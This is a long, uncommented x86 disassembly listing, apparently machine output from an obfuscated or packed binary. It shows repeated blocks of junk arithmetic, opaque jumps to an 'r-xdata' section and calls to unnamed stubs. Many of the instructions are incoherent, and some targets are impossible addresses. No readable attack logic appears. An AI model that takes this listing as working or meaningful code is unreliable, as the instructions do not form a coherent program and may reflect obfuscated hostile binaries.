mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fd6
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5c8
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9bc293
add [ eax ] al
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0c629
add esp 0x4
jae r-xdata
jl 0xf3c36e
jge r-xdata
jpe 0x74cd522d
pop eax
jg r-xdata
jge 0xffffffff894f9a67
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428bae3
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40413a
jne r-xdata
add esp 0x8
jg 0xf4505c9
jae r-xdata
ja 0xffffffffa3c34fd6
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc293
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5bc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_4041a2
jb 0xffffffff81b2be58
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
add esp 0x4
jae r-xdata
jl 0xf3c36e
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a67
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bae3
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5c8
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd12ea
jno r-xdata
jge 0xffffffffffa0c629
jge r-xdata
jpe 0x74cd522d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4041a2
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcac3ec
jno r-xdata
js 0x7f4505ab
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158c5c8
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5bc
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_4041a2
jb 0xffffffff81b2be58
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fd6
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9bc293
pop ecx
jne r-xdata
jbe 0xffd12ea
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0c629
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404206
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_404303
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_404244
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x586637bd
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_404267
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x586637bd
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c15185
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
push esp
push eax
call sub_4042ea
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40426a
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_404281
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119c9c4
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd522d
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7f5
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x586637bd
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
